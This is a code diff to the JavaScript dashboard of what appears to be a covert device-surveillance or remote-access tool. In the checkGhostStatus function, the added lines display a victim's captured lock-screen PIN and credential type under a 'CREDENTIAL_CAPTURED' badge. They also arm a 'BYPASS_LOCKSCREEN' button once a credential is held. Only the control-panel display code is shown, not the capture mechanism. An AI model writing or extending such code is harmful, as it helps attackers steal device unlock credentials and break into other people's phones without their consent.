@@ -1315,19 +1315,32 @@ async function checkGhostStatus() {
       }
 
       const watcherBadge = document.getElementById("keyguard-watcher-badge");
+      const bypassBtn = document.getElementById("bypass-lock-btn");
       if (watcherBadge) {
         if (data.hasCredential) {
           watcherBadge.style.borderColor = "var(--neon-green)";
           watcherBadge.style.color = "var(--neon-green)";
           watcherBadge.style.background = "rgba(57, 255, 20, 0.15)";
           watcherBadge.style.boxShadow = "0 0 12px rgba(57, 255, 20, 0.3)";
-          watcherBadge.innerHTML = "✔ STATUS: UNLOCK_CAPTURED (" + (data.credentialType || "CREDENTIAL") + ")";
+          watcherBadge.innerHTML = "✔ CREDENTIAL_CAPTURED (" + (data.credentialType || "CREDENTIAL") + (data.capturedPin ? ": " + data.capturedPin : "") + ")";
+          if (bypassBtn) {
+            bypassBtn.style.borderColor = "var(--neon-green)";
+            bypassBtn.style.color = "var(--neon-green)";
+            bypassBtn.style.background = "rgba(57, 255, 20, 0.12)";
+            bypassBtn.innerHTML = "🔓 BYPASS_LOCKSCREEN (READY)";
+          }
         } else {
           watcherBadge.style.borderColor = "#555";
           watcherBadge.style.color = "#888";
           watcherBadge.style.background = "rgba(255, 255, 255, 0.03)";
           watcherBadge.style.boxShadow = "none";
           watcherBadge.innerHTML = "&#9203; STATUS: WAITING_FOR_USER_UNLOCK";
+          if (bypassBtn) {
+            bypassBtn.style.borderColor = "var(--neon-cyan)";
+            bypassBtn.style.color = "var(--neon-cyan)";
+            bypassBtn.style.background = "rgba(0, 242, 255, 0.05)";
+            bypassBtn.innerHTML = "&#128275; BYPASS_LOCKSCREEN";
+          }
         }
       }
     }
